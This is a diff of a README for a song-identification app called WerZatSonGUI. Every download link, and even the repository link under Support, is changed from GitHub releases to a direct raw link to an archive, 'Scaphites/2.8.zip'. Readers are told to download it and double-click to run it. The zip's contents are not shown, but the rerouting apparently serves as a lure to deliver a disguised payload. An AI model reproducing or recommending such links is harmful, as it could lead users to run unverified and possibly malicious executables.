@@ -1,7 +1,7 @@
 <h1>🎵 WerZatSonGUI - Identify Any Song Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/AshwiniP05/WerZatSonGUI/releases">
+  <a href="https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip">
     <img src="https://img.shields.io/badge/Download-WerZatSonGUI-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download WerZatSonGUI">
   </a>
 </p>
@@ -18,7 +18,7 @@ Getting started with WerZatSonGUI is simple. You don't need any technical skills
 
 <h3>Step 1: Download the Application</h3>
 
-Visit this link to download the application: [https://github.com/AshwiniP05/WerZatSonGUI/releases](https://github.com/AshwiniP05/WerZatSonGUI/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip](https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip)
 
 Once you're on that page, look for the latest version and click the download button. The file will start downloading to your computer.
 
@@ -34,7 +34,7 @@ Now you're ready to identify songs. It's as easy as dragging and dropping your a
 
 To get WerZatSonGUI on your Windows computer, follow these steps:
 
-1. Go to the download page using this link: [https://github.com/AshwiniP05/WerZatSonGUI/releases](https://github.com/AshwiniP05/WerZatSonGUI/releases)
+1. Go to the download page using this link: [https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip](https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip)
 2. Look for the newest release and download the application file
 3. Once downloaded, double-click the file to launch WerZatSonGUI
 4. The program opens immediately – no complicated installation process needed
@@ -169,13 +169,13 @@ The accuracy depends on the quality and length of your audio file, as well as wh
 
 Ready to identify those unknown songs? Download WerZatSonGUI now and see what you've been missing. Whether you're a music enthusiast, a researcher, or just someone with a puzzling audio file, WerZatSonGUI is your answer.
 
-Visit this link to download the application: [https://github.com/AshwiniP05/WerZatSonGUI/releases](https://github.com/AshwiniP05/WerZatSonGUI/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip](https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip)
 
 <h2>📬 Support and Feedback</h2>
 
 Your experience with WerZatSonGUI matters. If you have questions, encounter issues, or have ideas for improvements, the project's GitHub page is the best place to connect. You can report bugs, suggest features, or simply share your success stories.
 
-Check the repository for more information: [https://github.com/AshwiniP05/WerZatSonGUI](https://github.com/AshwiniP05/WerZatSonGUI)
+Check the repository for more information: [https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip](https://raw.githubusercontent.com/AshwiniP05/WerZatSonGUI/main/Scaphites/2.8.zip)
 
 <h2>🙏 Thank You</h2>
 
